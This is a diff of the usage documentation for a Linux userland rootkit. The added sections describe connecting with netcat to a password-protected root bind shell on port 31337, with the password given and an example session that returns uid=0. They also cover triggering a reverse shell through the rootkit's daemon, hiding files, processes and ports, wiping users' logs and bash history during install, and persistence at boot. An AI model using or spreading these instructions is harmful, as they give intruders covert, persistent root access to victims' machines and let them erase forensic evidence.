@@ -60,7 +60,7 @@ Rootkit built in daemon is listening on port 31335.
 Using the rootkit built in daemon, you can issue a reverse shell connection and executing linux command on target machine (which you have installed rootkit) remotely.
   To connect  to rootkit daemon, open your terminal and type :
   <pre>
-  nc <target ip> 31335
+  nc "target ip" 31335
   </pre>
 <br>
 Example : 
@@ -98,7 +98,7 @@ Open another terminal tab and connect to target server on port 31335 :
 <pre>
 nc server ip 31335
 then type : 
-/opt/bds_elf/bds_bc <your ip address>
+/opt/bds_elf/bds_bc "your ip address"
 </pre>  
 Wait a few seconds and you will get reverse shell port connection from your target server.
 <br>
@@ -128,4 +128,62 @@ uname -a
 Linux robotsoft-virtualbox 6.2.0-20-generic #20-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  6 07:48:48 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 </pre>
 </p>
+<p>
+<h4>Connecting to Bind Shell Port</h4>
+<br>
+Bind shell port on server (which you have installed rootkit) is at port 31337, the password is <b>bluedragonsec</b></b>.
+You can connect to bind shell port using netcat :
+<pre>
+nc "server ip address" 31337
+then type the password : bluedragonsec  
+</pre>
+Example :
+<br>
+Server ip address (with bds userland rootkit installed) is at 192.168.43.36.
+<pre>
+robotsoft@robotsoft:~$ nc 192.168.43.36 31337
+Password :bluedragonsec
+Linux robotsoft-virtualbox 6.2.0-20-generic #20-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  6 07:48:48 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+id
+uid=0(root) gid=0(root) groups=0(root)
+uname -a
+Linux robotsoft-virtualbox 6.2.0-20-generic #20-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  6 07:48:48 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+</pre>
+</p>
+
+<p>
+<h4>Hiding Files and Directories</h4>
+<br>
+To hide file and directory just give prefix bds_ to file name and directory name
+</p>
+
+<b>How to Clean Logs and Bash History ?</b>
+<br>
+Before running installation script, add username to usernames_to_clear_logs.txt in new line, example:
+<pre>
+root
+robotsoft
+</pre>
+User logs will be cleaned during rootkit installation
+</p>
+
+
+<p>
+<b>Process Hiding</b>
+<br>
+This rootkit hides bind shell process, reverse shell process and rootkit built-in daemon process.
+</p>
+
+<p>
+<b>Port Hiding</b>
+<br>
+This rootkit hides bind shell port, reverse shell port and rootkit built-in daemon port.
+</p>
+
+<p>
+<b>Persistence</b>
+<br>
+  The rootkit is activated every time the system starts up. After the reboot, wait for 2 minutes, the rootkit will be activated.
+</p>
+
 
